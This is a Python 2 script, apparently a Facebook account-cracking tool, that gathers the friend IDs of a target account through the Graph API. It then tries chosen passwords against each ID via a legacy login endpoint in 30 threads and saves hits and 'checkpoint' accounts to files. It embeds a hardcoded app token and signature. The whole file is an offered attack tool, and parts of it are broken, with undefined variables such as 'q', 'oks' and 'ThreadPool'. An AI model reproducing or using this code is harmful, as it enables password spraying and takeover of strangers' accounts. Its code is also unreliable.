#!/usr/bin/python
# coding=utf-8
# Originally Written By:JAM SHAHRUKH
# Source : Python2"
# Donot Recode It. 

#Import module
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass,mechanize,requests
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor
	 
def exit():
	print "[!] Exit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def hamza(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

		
##### LOGO #####
banner = """
\033[1;91m  ██████████  \033[1;96m██████████  \033[1;93m█████████  \033[1;92m ▀
\033[1;91m  ███    ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ 
\033[1;91m  ███         \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ 
\033[1;91m  ██████████  \033[1;96m██████████  \033[1;93m███   ███  \033[1;92m███ 
\033[1;91m         ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███  
\033[1;91m  ███    ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███  
\033[1;91m  ██████████  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ \x1b[1;90mQUEEN
\033[1;94m══════════════════════════════════════════════
\033[1;90m➣ Author : \033[1;97mSTYLISH QUEEN
\033[1;90m➣ Github : \033[1;97mhttps://github.com/stylish-queen
\033[1;90m➣ Fb Page: \033[1;97mJam Shahrukh Official
\033[1;94m══════════════════════════════════════════════ """
back = 0
id = []
die = 0
chek = []
hack = []
count = 0
check = 0
result = 0
def menu2():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"[!] Token Not Found"
		os.system('rm -rf login.txt')
		os.system('python2 jam.py')
		time.sleep(1)
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		name = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"[!] Account Is On Checkpoint"
		os.system('rm -rf login.txt')
		os.system('python2 jam.py')
		time.sleep(1)
	except requests.exceptions.ConnectionError:
		print"[!] No Connection"
		time.sleep(1)
		exit()
	os.system("clear")
	print banner
	print "|[✓] Name: "+name
	print "|[✓] ID  : "+id
	print "-"+46*"-"
	print "[1] Clone With 5 Choice Passwords."
	print "[2] Clone With 2 Choice Passwords."
	print "[0] Back To Main Menu."
	print "                      "
	menu2_menu()
	
def menu2_menu():
    m2m = raw_input('\nChoose Option >> ')
    if m2m =="":
        print "[!] Filled Incorrectly."
        time.sleep(1)
        menu2_menu()
    elif m2m =="1":
        choice1()
    elif m2m =="2":
        choice2()
    elif m2m =="0":
        os.system('clear')
        hamza('Please Wait.')
        hamza('While Is Returning To Main Menu.')
        time.sleep(1)
        os.system('python2 sani.py')
    else:
        print "[!] Wrong Input."
        menu2_menu()
        
        
def choice1():
	global toket
	os.system("clear")
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print("[!] Token invalid")
		os.system("rm -rf login.txt")
		time.sleep(1)
		os.system("python2 jam.py")
	os.system("clear")
	print banner
	print ("[1] Crack From Any Public ID.")
	print ("[2] Crack From File.")
	print ("[0] Back")
	print ("        ")
	choice1_menu()

def choice1_menu():
	c1m = raw_input("\nChoose Option >> ")
	if c1m =="":
		print ("[!] Fill in correctly")
		choice_menu()
	elif c1m =="1":
		os.system("clear")
		print (banner)
		idt = raw_input("[✓] Enter ID : ")
		pass1=raw_input("[1] Input Password  : ")
		pass2=raw_input("[2] Input Password  : ")
		pass3=raw_input("[3] Input Password  : ")
		pass4=raw_input("[4] Input Password  : ")
		pass5=raw_input("[5] Input Password  : ")
		print(47*"-")
		print (banner)
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			hamza("[✓] Account  Name: "+op["name"])
			
			time.sleep(0.5)
		except KeyError:
			print("[!] ID Not Found!")
			raw_input("\nPress Enter To Back ")
			choice1()
		print"\033[1;35;40m[✺] Getting IDs..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif c1m =="2":
		os.system("clear")
		print (banner)
		try:
			idlist = raw_input("[✓] Enter File Path  : ")
			pass1=raw_input("[1] Input Password  : ")
			print(47*"-")
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\nPress Enter To Back ")
			choice1()
	elif c1m =="0":
		menu2()
	else:
		print ("[!] Fill in correctly")
		choice1_menu()
	rana = str(len(id))
	hamza ("[✓] Total Friends: "+rana)
	time.sleep(0.5)
	hamza ("[✓] The Process Has Been Started.")
	time.sleep(0.5)
	hamza ("[!] Press CTRL Z To Stop Process")
	time.sleep(0.5)
	print (47*"-")
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
		    os.mkdir('save')
		except OSError:
		    pass
		try:
			b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
                        params = {
                                'access_token': b,
                                'format': 'JSON',
                                'sdk_version': '2',
                                'email': user,
                                'locale': 'en_US',
                                'password': pass1,
                                'sdk': 'ios',
                                'generate_session_cookies': '1',
                                'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
                        }
                        api = 'https://b-api.facebook.com/method/auth.login'
                        response = requests.get(api, params=params)
			if "access_token" in q:
				print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + user + ' \x1b[1;96m|\x1b[1;96m ' + pass1
				oks.append(user+pass1)
			else:
				if "www.facebook.com" in response.json()["error_msg"]:
					print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass1
					crt = open("save/checkpoint.txt", "a")
					crt.write(user+"|"+pass1+"\n")
					crt.close()
					checkpoint.append(user+pass1)
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;97m----------------------------------------------"
	hamza('[✓] Process Has Been Completed.')
	hamza('\033[1;97m[✓] Checkpoint IDS Has Been Saved.')
	xx = str(len(oks))
	xxx = str(len(checkpoint))
	print ("[✓] Total \033[1;32mOK/\033[1;97mCP : \033[1;32m"+str(len(oks))+"/\033[1;97m"+str(len(checkpoint)))
	print (47*"-")
	raw_input("\nPress Enter To Back ")
	choice1()
	
	
if __name__ == '__main__':
	menu2()
